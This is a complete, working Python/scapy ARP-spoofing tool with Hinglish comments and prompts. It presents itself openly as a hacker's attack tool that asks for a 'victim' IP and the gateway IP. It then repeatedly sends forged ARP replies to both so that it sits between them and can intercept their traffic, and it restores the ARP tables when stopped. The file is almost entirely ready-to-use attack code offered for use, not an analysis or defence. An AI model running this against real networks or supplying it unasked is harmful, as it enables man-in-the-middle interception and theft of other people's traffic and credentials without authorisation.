import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # ARP request packet banate hain
    arp_request = scapy.ARP(pdst=ip)
    # Broadcast MAC (sabko bhejte hain puchene ke liye)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    # Packet bhejna aur jawab ka wait karna
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    # Target ka Asli MAC address dhundhte hain
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Bhai, {target_ip} ka MAC nahi mila. Check karo IP zinda hai ya nahi!")
        sys.exit()
        
    # Ye hai jhootha packet! (op=2 matlab hum response de rahe hain bina pooche)
    # Hum target ko bolte hain ki humara laptop hi Router (spoof_ip) hai.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    # Hack khatam hone par sab kuch pehle jaisa normal kar dena
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

if __name__ == "__main__":
    print("====================================")
    print("😈 Asli Hacker ka ARP Spoofer 😈")
    print("====================================")
    target_ip = input("Shikaar (Victim) ka IP daalo: ")
    gateway_ip = input("Router ka IP daalo: ")
    
    try:
        sent_packets_count = 0
        print("\n[+] ARP Spoofing shuru ho rahi hai... Rokne ke liye Ctrl+C dabana.")
        while True:
            # Shikaar ko bolo main Router hoon
            spoof(target_ip, gateway_ip)
            # Router ko bolo main Shikaar hoon
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Jhoothe Packets bhej diye: {sent_packets_count}", end="")
            time.sleep(2) # Har 2 second mein attack repeat hota hai
    except KeyboardInterrupt:
        print("\n\n[-] Attack rok diya gaya! Network wapas normal ho raha hai...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Sab theek hai. Exiting.")
